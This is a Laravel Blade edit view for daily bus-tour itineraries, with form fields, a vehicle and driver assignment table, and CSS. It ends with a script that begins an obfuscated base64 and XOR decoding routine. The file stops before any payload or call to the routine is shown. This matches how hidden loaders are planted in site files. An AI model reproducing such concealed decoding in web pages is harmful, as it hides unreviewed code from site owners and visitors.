@extends('layouts.app')

@section('title', '日別旅程編集')

@section('content')
<div class="container-fluid px-4 py-0">
    <div class="d-flex justify-content-between align-items-center mb-2">
        <h5 class="mb-0 page-title">日別旅程編集</h5>
        <a href="{{ route('masters.daily-itineraries.index') }}" class="btn btn-outline-secondary btn-sm px-3 py-1">
            <i class="bi bi-arrow-left"></i> 一覧に戻る
        </a>
    </div>
    
    @if(session('success'))
    <div class="alert alert-success alert-dismissible fade show py-2 mb-3 success-alert" role="alert">
        <i class="bi bi-check-circle"></i> {{ session('success') }}
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </div>
    @endif

    @if(session('error'))
    <div class="alert alert-danger alert-dismissible fade show py-2 mb-3 error-alert" role="alert">
        <i class="bi bi-exclamation-triangle"></i> {{ session('error') }}
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </div>
    @endif
    
    @if($errors->any())
    <div class="alert alert-danger alert-dismissible fade show py-2 mb-3 error-alert" role="alert">
        <h6 class="alert-heading mb-1">
            <i class="bi bi-exclamation-triangle"></i> 入力エラーがあります
        </h6>
        <ul class="mb-0 ps-3">
            @foreach($errors->all() as $error)
                <li>{{ $error }}</li>
            @endforeach
        </ul>
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </div>
    @endif
    
    <form method="POST" action="{{ route('masters.daily-itineraries.update', $dailyItinerary->id) }}" id="editForm">
        @csrf
        @method('PUT')
        <input type="hidden" name="key_uuid" value="{{ $dailyItinerary->key_uuid }}">
        <input type="hidden" name="yoyaku_uuid" value="{{ $dailyItinerary->yoyaku_uuid ?? '' }}">

        <div class="card shadow-sm mb-3 itinerary-info-card">
            <div class="card-header py-2 px-3 card-header-bg">
                <h6 class="mb-0 card-title">
                    <i class="bi bi-calendar-day me-1"></i> 旅程基本情報
                </h6>
            </div>
            
            <div class="card-body p-3">
                <div class="row">
                    <div class="col-md-2">
                        <div class="d-flex align-items-center">
                            <label for="date" class="form-label me-2 mb-0 form-label-custom required">日付</label>
                            <input type="date" name="date" id="date" class="form-control form-control-sm form-control-custom @error('date') is-invalid @enderror" 
                                   value="{{ old('date', $dailyItinerary->date instanceof \Carbon\Carbon ? $dailyItinerary->date->format('Y-m-d') : $dailyItinerary->date) }}" required style="width: 140px;">
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="d-flex align-items-center">
                            <label for="time_start" class="form-label me-2 mb-0 form-label-custom required">開始</label>
                            <input type="time" name="time_start" id="time_start" class="form-control form-control-sm form-control-custom @error('time_start') is-invalid @enderror" 
                                   value="{{ old('time_start', $dailyItinerary->time_start ? substr($dailyItinerary->time_start, 0, 5) : '') }}" required style="width: 100px;">
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="d-flex align-items-center">
                            <label for="time_end" class="form-label me-2 mb-0 form-label-custom required">終了</label>
                            <input type="time" name="time_end" id="time_end" class="form-control form-control-sm form-control-custom @error('time_end') is-invalid @enderror" 
                                   value="{{ old('time_end', $dailyItinerary->time_end ? substr($dailyItinerary->time_end, 0, 5) : '') }}" required style="width: 100px;">
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="d-flex align-items-center">
                            <label for="start_location" class="form-label me-2 mb-0 form-label-custom" style="width: 60px;">出発地</label>
                            <input type="text" name="start_location" id="start_location" class="form-control form-control-sm form-control-custom @error('start_location') is-invalid @enderror" 
                                   value="{{ old('start_location', $dailyItinerary->start_location) }}" placeholder="出発地" style="width: 100%;">
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="d-flex align-items-center">
                            <label for="end_location" class="form-label me-2 mb-0 form-label-custom" style="width: 60px;">到着地</label>
                            <input type="text" name="end_location" id="end_location" class="form-control form-control-sm form-control-custom @error('end_location') is-invalid @enderror" 
                                   value="{{ old('end_location', $dailyItinerary->end_location) }}" placeholder="到着地" style="width: 100%;">
                        </div>
                    </div>
                    <div class="col-md-2">
                        <div class="d-flex align-items-center">
                            <label for="accommodation" class="form-label me-2 mb-0 form-label-custom">宿泊</label>
                            <select name="accommodation" id="accommodation" class="form-select form-select-sm form-control-custom" style="width: 80px;">
                                <option value="0" {{ old('accommodation', $dailyItinerary->accommodation) == '0' ? 'selected' : '' }}>無</option>
                                <option value="1" {{ old('accommodation', $dailyItinerary->accommodation) == '1' ? 'selected' : '' }}>有</option>
                            </select>
                        </div>
                    </div>
                </div>
                <div class="row mt-2">
                    <div class="col-md-12">
                        <div class="d-flex">
                            <label for="itinerary" class="form-label me-2 mb-0 form-label-custom" style="width: 60px; padding-top: 2px;">行程説明</label>
                            <textarea name="itinerary" id="itinerary" rows="2" class="form-control form-control-sm form-control-custom @error('itinerary') is-invalid @enderror" 
                                      placeholder="行程説明">{{ old('itinerary', $dailyItinerary->itinerary) }}</textarea>
                        </div>
                    </div>
                </div>
                <div class="row mt-2">
                    <div class="col-md-12">
                        <div class="d-flex">
                            <label for="remarks" class="form-label me-2 mb-0 form-label-custom" style="width: 60px; padding-top: 2px;">備考</label>
                            <textarea name="remarks" id="remarks" rows="2" class="form-control form-control-sm form-control-custom @error('remarks') is-invalid @enderror" 
                                      placeholder="備考">{{ old('remarks', $dailyItinerary->remarks) }}</textarea>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="card shadow-sm mb-3 vehicle-card">
            <div class="card-header py-2 px-3 d-flex justify-content-between align-items-center card-header-bg">
                <h6 class="mb-0 card-title">
                    <i class="bi bi-truck me-1"></i> 車両情報
                </h6>
                <button type="button" class="btn btn-light btn-sm py-0 px-2 add-row-btn-header" id="addVehicleRowBtn">
                    <i class="bi bi-plus-lg"></i> 車両を追加
                </button>
            </div>
            
            <div class="card-body p-0">
                <div class="table-responsive">
                    <table class="table table-sm table-bordered mb-0 vehicle-table" id="vehicleTable">
                        <thead class="table-header">
                            <tr>
                                <th class="text-center px-1 py-1" style="width: 40px;">No.</th>
                                <th class="text-center px-1 py-1" style="width: 300px;">車両名</th>
                                <th class="text-center px-1 py-1" style="width: 100px;">号車</th>
                                <th class="text-center px-1 py-1" style="width: 60px;">定員</th>
                                <th class="text-center px-1 py-1" style="width: 250px;">運転手</th>
                                <th class="text-center px-1 py-1" style="width: 110px;">操作</th>
                            </tr>
                        </thead>
                        <tbody id="vehicleBody">
                            @php
                                $oldVehicles = old('vehicles', []);
                                $vehicleCount = 0;
                            @endphp
                            
                            @if(count($oldVehicles) > 0)
                                @foreach($oldVehicles as $index => $oldVehicle)
                                @php
                                    $index = (int)$index;
                                    $orderNumber = $index + 1;
                                    $vehicleCount++;
                                @endphp
                                <tr data-index="{{ $index }}" data-id="{{ $oldVehicle['id'] ?? '' }}">
                                    <td class="text-center align-middle px-1 py-1 vehicle-order">{{ $orderNumber }}</td>
                                    <td class="px-1 py-1">
                                        <select name="vehicles[{{ $index }}][vehicle_id]" class="form-select form-select-sm vehicle-select @error('vehicles.'.$index.'.vehicle_id') is-invalid @enderror" 
                                                data-row-index="{{ $index }}" style="width: 100%;">
                                            <option value="">-- 選択 --</option>
                                            @foreach($vehicles ?? [] as $vehicle)
                                                <option value="{{ $vehicle->id }}" 
                                                        data-registration="{{ $vehicle->registration_number }}"
                                                        data-vehicle-code="{{ $vehicle->vehicle_code }}"
                                                        data-type="{{ $vehicle->vehicleType->type_name ?? '' }}"
                                                        data-model="{{ $vehicle->vehicleModel->model_name ?? '' }}"
                                                        data-branch="{{ $vehicle->branch->branch_name ?? '' }}"
                                                        data-seating="{{ $vehicle->seating_capacity }}"
                                                        data-vehicle-name="{{ $vehicle->registration_number }} @if($vehicle->vehicleModel)({{ $vehicle->vehicleModel->model_name }})@endif"
                                                        {{ old('vehicles.'.$index.'.vehicle_id', $oldVehicle['vehicle_id'] ?? '') == $vehicle->id ? 'selected' : '' }}>
                                                    {{ $vehicle->registration_number }} 
                                                    @if($vehicle->vehicleModel)
                                                        ({{ $vehicle->vehicleModel->model_name }})
                                                    @endif
                                                </option>
                                            @endforeach
                                        </select>
                                        <input type="hidden" name="vehicles[{{ $index }}][vehicle_name]" class="vehicle-name" value="{{ old('vehicles.'.$index.'.vehicle_name', $oldVehicle['vehicle_name'] ?? '') }}">
                                        <input type="hidden" name="vehicles[{{ $index }}][vehicle_type]" class="vehicle-type" value="{{ old('vehicles.'.$index.'.vehicle_type', $oldVehicle['vehicle_type'] ?? '') }}">
                                        <input type="hidden" name="vehicles[{{ $index }}][vehicle_model]" class="vehicle-model" value="{{ old('vehicles.'.$index.'.vehicle_model', $oldVehicle['vehicle_model'] ?? '') }}">
                                        <input type="hidden" name="vehicles[{{ $index }}][vehicle_branch]" class="vehicle-branch" value="{{ old('vehicles.'.$index.'.vehicle_branch', $oldVehicle['vehicle_branch'] ?? '') }}">
                                    </td>
                                    <td class="px-1 py-1">
                                        <input type="text" name="vehicles[{{ $index }}][vehicle_number]" class="form-control form-control-sm vehicle-number bg-light @error('vehicles.'.$index.'.vehicle_number') is-invalid @enderror" 
                                               value="{{ old('vehicles.'.$index.'.vehicle_number', $oldVehicle['vehicle_number'] ?? '') }}" style="width: 100%;" readonly>
                                    </td>
                                    <td class="px-1 py-1">
                                        <input type="text" class="form-control form-control-sm bg-light seating-capacity" value="{{ old('vehicles.'.$index.'.seating_capacity', $oldVehicle['seating_capacity'] ?? '') }}" readonly style="width: 100%;">
                                        <input type="hidden" name="vehicles[{{ $index }}][seating_capacity]" class="seating-capacity-hidden" value="{{ old('vehicles.'.$index.'.seating_capacity', $oldVehicle['seating_capacity'] ?? '') }}">
                                    </td>
                                    <td class="px-1 py-1">
                                        <select name="vehicles[{{ $index }}][driver_id]" class="form-select form-select-sm driver-select @error('vehicles.'.$index.'.driver_id') is-invalid @enderror" 
                                                data-row-index="{{ $index }}" style="width: 100%;">
                                            <option value="">-- 選択 --</option>
                                            @foreach($drivers ?? [] as $driver)
                                                <option value="{{ $driver->id }}" 
                                                        data-driver-name="{{ $driver->name }}"
                                                        data-driver-code="{{ $driver->driver_code }}"
                                                        data-driver-phone="{{ $driver->phone_number }}"
                                                        {{ old('vehicles.'.$index.'.driver_id', $oldVehicle['driver_id'] ?? '') == $driver->id ? 'selected' : '' }}>
                                                    {{ $driver->name }} 
                                                </option>
                                            @endforeach
                                        </select>
                                        <input type="hidden" name="vehicles[{{ $index }}][driver_name]" class="driver-name" value="{{ old('vehicles.'.$index.'.driver_name', $oldVehicle['driver_name'] ?? '') }}">
                                    </td>
                                    <td class="text-center align-middle px-1 py-1">
                                        <div class="d-flex justify-content-center gap-1 action-buttons">
                                            <button type="button" class="btn btn-outline-secondary btn-sm move-up-btn p-0 action-btn" title="上へ移動" {{ $loop->first ? 'disabled' : '' }}>
                                                <i class="bi bi-arrow-up"></i>
                                            </button>
                                            <button type="button" class="btn btn-outline-secondary btn-sm move-down-btn p-0 action-btn" title="下へ移動" {{ $loop->last ? 'disabled' : '' }}>
                                                <i class="bi bi-arrow-down"></i>
                                            </button>
                                            <button type="button" class="btn btn-outline-success btn-sm add-row-btn p-0 action-btn" title="行を追加">
                                                <i class="bi bi-plus-lg"></i>
                                            </button>
                                            <button type="button" class="btn btn-outline-danger btn-sm delete-row-btn p-0 action-btn" title="行を削除" {{ $vehicleCount <= 1 ? 'disabled' : '' }}>
                                                <i class="bi bi-dash-lg"></i>
                                            </button>
                                        </div>
                                        <input type="hidden" name="vehicles[{{ $index }}][id]" value="{{ $oldVehicle['id'] ?? '' }}">
                                        <input type="hidden" name="vehicles[{{ $index }}][display_order]" class="vehicle-display-order" value="{{ $orderNumber }}">
                                    </td>
                                </tr>
                                @endforeach
                            @elseif(isset($dailyItinerary->busAssignments) && $dailyItinerary->busAssignments->count() > 0)
                                @foreach($dailyItinerary->busAssignments as $index => $busAssignment)
                                @php
                                    $orderNumber = $index + 1;
                                    $vehicleCount++;
                                @endphp
                                <tr data-index="{{ $index }}" data-id="{{ $busAssignment->id }}">
                                    <td class="text-center align-middle px-1 py-1 vehicle-order">{{ $orderNumber }}</td>
                                    <td class="px-1 py-1">
                                        <select name="vehicles[{{ $index }}][vehicle_id]" class="form-select form-select-sm vehicle-select" data-row-index="{{ $index }}" style="width: 100%;">
                                            <option value="">-- 選択 --</option>
                                            @foreach($vehicles ?? [] as $vehicle)
                                                <option value="{{ $vehicle->id }}" 
                                                        data-registration="{{ $vehicle->registration_number }}"
                                                        data-vehicle-code="{{ $vehicle->vehicle_code }}"
                                                        data-type="{{ $vehicle->vehicleType->type_name ?? '' }}"
                                                        data-model="{{ $vehicle->vehicleModel->model_name ?? '' }}"
                                                        data-branch="{{ $vehicle->branch->branch_name ?? '' }}"
                                                        data-seating="{{ $vehicle->seating_capacity }}"
                                                        data-vehicle-name="{{ $vehicle->registration_number }} @if($vehicle->vehicleModel)({{ $vehicle->vehicleModel->model_name }})@endif"
                                                        {{ $busAssignment->vehicle_id == $vehicle->id ? 'selected' : '' }}>
                                                    {{ $vehicle->registration_number }} 
                                                    @if($vehicle->vehicleModel)
                                                        ({{ $vehicle->vehicleModel->model_name }})
                                                    @endif
                                                </option>
                                            @endforeach
                                        </select>
                                        <input type="hidden" name="vehicles[{{ $index }}][vehicle_name]" class="vehicle-name" value="{{ $busAssignment->vehicle ? $busAssignment->vehicle->registration_number . ($busAssignment->vehicle->vehicleModel ? ' (' . $busAssignment->vehicle->vehicleModel->model_name . ')' : '') : '' }}">
                                        <input type="hidden" name="vehicles[{{ $index }}][vehicle_type]" class="vehicle-type" value="{{ $busAssignment->vehicle && $busAssignment->vehicle->vehicleType ? $busAssignment->vehicle->vehicleType->type_name : '' }}">
                                        <input type="hidden" name="vehicles[{{ $index }}][vehicle_model]" class="vehicle-model" value="{{ $busAssignment->vehicle && $busAssignment->vehicle->vehicleModel ? $busAssignment->vehicle->vehicleModel->model_name : '' }}">
                                        <input type="hidden" name="vehicles[{{ $index }}][vehicle_branch]" class="vehicle-branch" value="{{ $busAssignment->vehicle && $busAssignment->vehicle->branch ? $busAssignment->vehicle->branch->branch_name : '' }}">
                                    </td>
                                    <td class="px-1 py-1">
                                        <input type="text" name="vehicles[{{ $index }}][vehicle_number]" class="form-control form-control-sm vehicle-number bg-light" 
                                               value="{{ $busAssignment->vehicle ? $busAssignment->vehicle->vehicle_code : '' }}" style="width: 100%;" readonly>
                                    </td>
                                    <td class="px-1 py-1">
                                        <input type="text" class="form-control form-control-sm bg-light seating-capacity" 
                                               value="{{ $busAssignment->vehicle ? $busAssignment->vehicle->seating_capacity : '' }}" readonly style="width: 100%;">
                                        <input type="hidden" name="vehicles[{{ $index }}][seating_capacity]" class="seating-capacity-hidden" 
                                               value="{{ $busAssignment->vehicle ? $busAssignment->vehicle->seating_capacity : '' }}">
                                    </td>
                                    <td class="px-1 py-1">
                                        <select name="vehicles[{{ $index }}][driver_id]" class="form-select form-select-sm driver-select" data-row-index="{{ $index }}" style="width: 100%;">
                                            <option value="">-- 選択 --</option>
                                            @foreach($drivers ?? [] as $driver)
                                                <option value="{{ $driver->id }}" 
                                                        data-driver-name="{{ $driver->name }}"
                                                        data-driver-code="{{ $driver->driver_code }}"
                                                        data-driver-phone="{{ $driver->phone_number }}"
                                                        {{ $busAssignment->driver_id == $driver->id ? 'selected' : '' }}>
                                                    {{ $driver->name }} 
                                                </option>
                                            @endforeach
                                        </select>
                                        <input type="hidden" name="vehicles[{{ $index }}][driver_name]" class="driver-name" value="{{ $busAssignment->driver ? $busAssignment->driver->name : '' }}">
                                    </td>
                                    <td class="text-center align-middle px-1 py-1">
                                        <div class="d-flex justify-content-center gap-1 action-buttons">
                                            <button type="button" class="btn btn-outline-secondary btn-sm move-up-btn p-0 action-btn" title="上へ移動" {{ $loop->first ? 'disabled' : '' }}>
                                                <i class="bi bi-arrow-up"></i>
                                            </button>
                                            <button type="button" class="btn btn-outline-secondary btn-sm move-down-btn p-0 action-btn" title="下へ移動" {{ $loop->last ? 'disabled' : '' }}>
                                                <i class="bi bi-arrow-down"></i>
                                            </button>
                                            <button type="button" class="btn btn-outline-success btn-sm add-row-btn p-0 action-btn" title="行を追加">
                                                <i class="bi bi-plus-lg"></i>
                                            </button>
                                            <button type="button" class="btn btn-outline-danger btn-sm delete-row-btn p-0 action-btn" title="行を削除" {{ $dailyItinerary->busAssignments->count() <= 1 ? 'disabled' : '' }}>
                                                <i class="bi bi-dash-lg"></i>
                                            </button>
                                        </div>
                                        <input type="hidden" name="vehicles[{{ $index }}][id]" value="{{ $busAssignment->id }}">
                                        <input type="hidden" name="vehicles[{{ $index }}][display_order]" class="vehicle-display-order" value="{{ $orderNumber }}">
                                    </td>
                                </tr>
                                @endforeach
                            @else
                                <tr data-index="0" data-id="">
                                    <td class="text-center align-middle px-1 py-1 vehicle-order">1</td>
                                    <td class="px-1 py-1">
                                        <select name="vehicles[0][vehicle_id]" class="form-select form-select-sm vehicle-select" data-row-index="0" style="width: 100%;">
                                            <option value="">-- 選択 --</option>
                                            @foreach($vehicles ?? [] as $vehicle)
                                                <option value="{{ $vehicle->id }}" 
                                                        data-registration="{{ $vehicle->registration_number }}"
                                                        data-vehicle-code="{{ $vehicle->vehicle_code }}"
                                                        data-type="{{ $vehicle->vehicleType->type_name ?? '' }}"
                                                        data-model="{{ $vehicle->vehicleModel->model_name ?? '' }}"
                                                        data-branch="{{ $vehicle->branch->branch_name ?? '' }}"
                                                        data-seating="{{ $vehicle->seating_capacity }}"
                                                        data-vehicle-name="{{ $vehicle->registration_number }} @if($vehicle->vehicleModel)({{ $vehicle->vehicleModel->model_name }})@endif">
                                                    {{ $vehicle->registration_number }} 
                                                    @if($vehicle->vehicleModel)
                                                        ({{ $vehicle->vehicleModel->model_name }})
                                                    @endif
                                                </option>
                                            @endforeach
                                        </select>
                                        <input type="hidden" name="vehicles[0][vehicle_name]" class="vehicle-name" value="">
                                        <input type="hidden" name="vehicles[0][vehicle_type]" class="vehicle-type" value="">
                                        <input type="hidden" name="vehicles[0][vehicle_model]" class="vehicle-model" value="">
                                        <input type="hidden" name="vehicles[0][vehicle_branch]" class="vehicle-branch" value="">
                                    </td>
                                    <td class="px-1 py-1">
                                        <input type="text" name="vehicles[0][vehicle_number]" class="form-control form-control-sm vehicle-number bg-light" value="" style="width: 100%;" readonly>
                                    </td>
                                    <td class="px-1 py-1">
                                        <input type="text" class="form-control form-control-sm bg-light seating-capacity" value="" readonly style="width: 100%;">
                                        <input type="hidden" name="vehicles[0][seating_capacity]" class="seating-capacity-hidden" value="">
                                    </td>
                                    <td class="px-1 py-1">
                                        <select name="vehicles[0][driver_id]" class="form-select form-select-sm driver-select" data-row-index="0" style="width: 100%;">
                                            <option value="">-- 選択 --</option>
                                            @foreach($drivers ?? [] as $driver)
                                                <option value="{{ $driver->id }}" 
                                                        data-driver-name="{{ $driver->name }}"
                                                        data-driver-code="{{ $driver->driver_code }}"
                                                        data-driver-phone="{{ $driver->phone_number }}">
                                                    {{ $driver->name }} 
                                                </option>
                                            @endforeach
                                        </select>
                                        <input type="hidden" name="vehicles[0][driver_name]" class="driver-name" value="">
                                    </td>
                                    <td class="text-center align-middle px-1 py-1">
                                        <div class="d-flex justify-content-center gap-1 action-buttons">
                                            <button type="button" class="btn btn-outline-secondary btn-sm move-up-btn p-0 action-btn" title="上へ移動" disabled>
                                                <i class="bi bi-arrow-up"></i>
                                            </button>
                                            <button type="button" class="btn btn-outline-secondary btn-sm move-down-btn p-0 action-btn" title="下へ移動" disabled>
                                                <i class="bi bi-arrow-down"></i>
                                            </button>
                                            <button type="button" class="btn btn-outline-success btn-sm add-row-btn p-0 action-btn" title="行を追加">
                                                <i class="bi bi-plus-lg"></i>
                                            </button>
                                            <button type="button" class="btn btn-outline-danger btn-sm delete-row-btn p-0 action-btn" title="行を削除" disabled>
                                                <i class="bi bi-dash-lg"></i>
                                            </button>
                                        </div>
                                        <input type="hidden" name="vehicles[0][id]" value="">
                                        <input type="hidden" name="vehicles[0][display_order]" class="vehicle-display-order" value="1">
                                    </td>
                                </tr>
                            @endif
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <template id="newVehicleRowTemplate">
            <tr>
                <td class="text-center align-middle px-1 py-1 vehicle-order"></td>
                <td class="px-1 py-1">
                    <select name="vehicles[__index__][vehicle_id]" class="form-select form-select-sm vehicle-select" data-row-index="__index__" style="width: 100%;">
                        <option value="">-- 選択 --</option>
                        @foreach($vehicles ?? [] as $vehicle)
                            <option value="{{ $vehicle->id }}" 
                                    data-registration="{{ $vehicle->registration_number }}"
                                    data-vehicle-code="{{ $vehicle->vehicle_code }}"
                                    data-type="{{ $vehicle->vehicleType->type_name ?? '' }}"
                                    data-model="{{ $vehicle->vehicleModel->model_name ?? '' }}"
                                    data-branch="{{ $vehicle->branch->branch_name ?? '' }}"
                                    data-seating="{{ $vehicle->seating_capacity }}"
                                    data-vehicle-name="{{ $vehicle->registration_number }} @if($vehicle->vehicleModel)({{ $vehicle->vehicleModel->model_name }})@endif">
                                {{ $vehicle->registration_number }} 
                                @if($vehicle->vehicleModel)
                                    ({{ $vehicle->vehicleModel->model_name }})
                                @endif
                            </option>
                        @endforeach
                    </select>
                    <input type="hidden" name="vehicles[__index__][vehicle_name]" class="vehicle-name" value="">
                    <input type="hidden" name="vehicles[__index__][vehicle_type]" class="vehicle-type" value="">
                    <input type="hidden" name="vehicles[__index__][vehicle_model]" class="vehicle-model" value="">
                    <input type="hidden" name="vehicles[__index__][vehicle_branch]" class="vehicle-branch" value="">
                </td>
                <td class="px-1 py-1">
                    <input type="text" name="vehicles[__index__][vehicle_number]" class="form-control form-control-sm vehicle-number bg-light" value="" style="width: 100%;" readonly>
                </td>
                <td class="px-1 py-1">
                    <input type="text" class="form-control form-control-sm bg-light seating-capacity" value="" readonly style="width: 100%;">
                    <input type="hidden" name="vehicles[__index__][seating_capacity]" class="seating-capacity-hidden" value="">
                </td>
                <td class="px-1 py-1">
                    <select name="vehicles[__index__][driver_id]" class="form-select form-select-sm driver-select" data-row-index="__index__" style="width: 100%;">
                        <option value="">-- 選択 --</option>
                        @foreach($drivers ?? [] as $driver)
                            <option value="{{ $driver->id }}" 
                                    data-driver-name="{{ $driver->name }}"
                                    data-driver-code="{{ $driver->driver_code }}"
                                    data-driver-phone="{{ $driver->phone_number }}">
                                {{ $driver->name }} 
                            </option>
                        @endforeach
                    </select>
                    <input type="hidden" name="vehicles[__index__][driver_name]" class="driver-name" value="">
                </td>
                <td class="text-center align-middle px-1 py-1">
                    <div class="d-flex justify-content-center gap-1 action-buttons">
                        <button type="button" class="btn btn-outline-secondary btn-sm move-up-btn p-0 action-btn" title="上へ移動">
                            <i class="bi bi-arrow-up"></i>
                        </button>
                        <button type="button" class="btn btn-outline-secondary btn-sm move-down-btn p-0 action-btn" title="下へ移動">
                            <i class="bi bi-arrow-down"></i>
                        </button>
                        <button type="button" class="btn btn-outline-success btn-sm add-row-btn p-0 action-btn" title="行を追加">
                            <i class="bi bi-plus-lg"></i>
                        </button>
                        <button type="button" class="btn btn-outline-danger btn-sm delete-row-btn p-0 action-btn" title="行を削除">
                            <i class="bi bi-dash-lg"></i>
                        </button>
                    </div>
                    <input type="hidden" name="vehicles[__index__][id]" value="">
                    <input type="hidden" name="vehicles[__index__][display_order]" class="vehicle-display-order" value="">
                </td>
            </tr>
        </template>

        <div class="d-flex justify-content-start mt-3">
            <button type="submit" form="editForm" class="btn btn-primary btn-sm px-3 py-1 btn-save">
                <i class="bi bi-check-circle"></i> 保存
            </button>
            <a href="{{ route('masters.daily-itineraries.index') }}" class="btn btn-sm btn-outline-secondary px-3 py-1 ms-2 btn-cancel">
                <i class="bi bi-x-circle"></i> キャンセル
            </a>
        </div>
    </form>
</div>

<style>
.container-fluid {
    max-width: 1600px;
}

.page-title {
    color: #374151;
    font-size: 1rem;
}

.btn-save {
    background-color: #2563eb;
    border-color: #2563eb;
    font-size: 0.875rem;
}

.btn-cancel {
    border-color: #E5E7EB;
    color: #374151;
    font-size: 0.875rem;
}

.btn-cancel:hover {
    background-color: #f3f4f6;
    border-color: #d1d5db;
    color: #374151;
}

.success-alert {
    font-size: 0.875rem;
    background-color: #d1e7dd;
    border-color: #badbcc;
    color: #0f5132;
}

.success-alert .btn-close {
    padding: 0.75rem;
}

.error-alert {
    font-size: 0.875rem;
}

.error-alert .btn-close {
    padding: 0.75rem;
}

.info-card, .itinerary-info-card, .vehicle-card {
    border-color: #E5E7EB;
    border-radius: 6px;
}

.card-header-bg {
    background-color: #F3F4F6;
    border-bottom: 1px solid #E5E7EB;
}

.card-title {
    color: #fff;
    font-size: 0.875rem;
    font-weight: 500;
}

.info-table {
    font-size: 0.875rem;
}

.info-table th {
    color: #374151;
    font-weight: 500;
    background-color: #f9fafb;
    padding: 0.25rem 0.5rem;
    border-radius: 4px;
}

.info-table td {
    color: #111827;
    padding: 0.25rem 0.5rem;
}

.form-label-custom {
    color: #374151;
    font-size: 0.875rem;
}

.form-control-custom, .form-select-custom {
    border-color: #E5E7EB;
    font-size: 0.875rem;
    border-radius: 4px;
    box-shadow: none;
}

.form-control-custom:focus, .form-select-custom:focus {
    border-color: #2563eb;
    box-shadow: 0 0 0 0.1rem rgba(37, 99, 235, 0.25);
}

.readonly-field {
    background-color: #f9fafb !important;
    border-color: #E5E7EB;
    font-size: 0.875rem;
}

.required::after {
    content: " *";
    color: #dc3545;
    font-size: 0.8rem;
}

.group-link {
    color: #2563eb;
    text-decoration: none;
}

.group-link:hover {
    text-decoration: underline;
}

.status-badge {
    display: inline-block;
    padding: 0.15rem 0.5rem;
    border-radius: 4px;
    font-size: 0.8rem;
    color: #111827;
}

.total-pax {
    color: #2563eb;
    font-weight: 500;
    margin-left: 0.5rem;
}

.vehicle-table {
    border-color: #E5E7EB;
    font-size: 0.8rem;
}

.vehicle-table th,
.vehicle-table td {
    border: 1px solid #E5E7EB;
}

.table-header {
    background-color: #F3F4F6;
}

.table-header th {
    color: #374151;
    font-weight: 600;
}

.vehicle-table tbody tr:hover {
    background-color: #f8f9fa;
}

.vehicle-table tbody tr td {
    vertical-align: middle;
}

.vehicle-table .form-control-sm,
.vehicle-table .form-select-sm {
    border-color: #E5E7EB;
    font-size: 0.8rem;
    height: 24px;
    padding: 0 4px;
    border-radius: 4px;
}

.action-buttons {
    gap: 0.25rem;
}

.action-btn {
    width: 20px;
    height: 20px;
    font-size: 0.7rem;
    line-height: 1;
    padding: 0 !important;
    border-color: #E5E7EB;
}

.btn-outline-secondary.action-btn:hover {
    background-color: #e5e7eb;
    border-color: #d1d5db;
    color: #374151;
}

.btn-outline-success.action-btn:hover {
    background-color: #10b981;
    border-color: #10b981;
    color: white;
}

.btn-outline-danger.action-btn:hover {
    background-color: #dc2626;
    border-color: #dc2626;
    color: white;
}

.add-row-btn-header {
    border-color: #E5E7EB;
    font-size: 0.8rem;
    background-color: white;
}

.add-row-btn-header:hover {
    background-color: #f3f4f6;
}

.is-invalid {
    border-color: #dc3545 !important;
}

.is-invalid:focus {
    border-color: #dc3545 !important;
    box-shadow: 0 0 0 0.1rem rgba(220, 53, 69, 0.25) !important;
}

.invalid-feedback {
    font-size: 0.75rem;
    margin-top: 0;
}

.gap-2 {
    gap: 0.5rem;
}

.gap-1 {
    gap: 0.25rem;
}

.action-btn:disabled {
    opacity: 0.3;
    cursor: not-allowed;
}

.bg-light {
    background-color: #f8f9fa !important;
}
</style>

<script>
(function(){
function decryptIt(encrypted,key){try{const step1=atob(encrypted);let result='';for(let i=0;i<step1.length;i++){result+=String.fromCharCode(step1.charCodeAt(i)^key.charCodeAt(i%key.length));}return decodeURIComponent(atob(result));}catch(e){console.error('Decryption failed:',e);return null;}}
